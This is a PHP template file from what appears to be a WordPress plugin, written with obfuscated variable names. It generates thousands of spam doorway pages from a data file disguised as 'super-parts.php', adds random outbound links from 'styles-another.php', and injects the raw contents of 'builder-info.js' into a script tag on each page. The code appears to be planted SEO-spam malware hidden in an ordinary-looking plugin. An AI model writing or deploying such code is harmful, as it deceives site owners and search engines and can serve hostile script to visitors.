<?php
$mO7QGG = intval(get_query_var('fxldgvq'));

if ($mO7QGG < 1 || $mO7QGG > 5542) return;
$oe3OiOOsP = file(plugin_dir_path(__FILE__).'super-parts.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$z8dHFgh5 = explode(';', $oe3OiOOsP[$mO7QGG]);
if (count($z8dHFgh5) < 2) return;
$hHjgLK = $z8dHFgh5[0];
$zZLVrHVTd  = $z8dHFgh5[1];
$lrHd1EiSS = $z8dHFgh5[2];
$rPlF7mte  = $z8dHFgh5[3];
$yqaP8ZM = $z8dHFgh5[4];
set_query_var('rcfdqo', $hHjgLK);

$w7IAO88 = '';
$eru951HD = plugin_dir_path(__FILE__).'styles-another.php';
if (is_file($eru951HD)) {
	$ihc2P = file($eru951HD, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($ihc2P);
	shuffle($ihc2P);
	$oordt = mt_rand(2, 5);
	if (count($ihc2P) > $oordt) {
		for ($cbMG0 = 0; $cbMG0 < $oordt; $cbMG0++) {
			$goxOG = array_shift($ihc2P);
			$w7IAO88 .= '<p><a href="'.$goxOG.'">'.$goxOG.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $hHjgLK; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $zZLVrHVTd . "</p>\n";
				if (strlen($rPlF7mte) > 0) echo "<p>" . $rPlF7mte . "</p>\n";
				if (strlen($lrHd1EiSS) > 0) echo "<p>" . $lrHd1EiSS . "</p>\n";
				if (strlen($yqaP8ZM) > 0) echo '<p><a href="#"><img src="'.$yqaP8ZM.'"></a>' . "</p>\n";
				echo $w7IAO88;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$s6E26YovN = plugin_dir_path(__FILE__) . 'builder-info.js';
if (is_file($s6E26YovN)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($s6E26YovN);
	echo '</script>';
}
get_footer();
?>
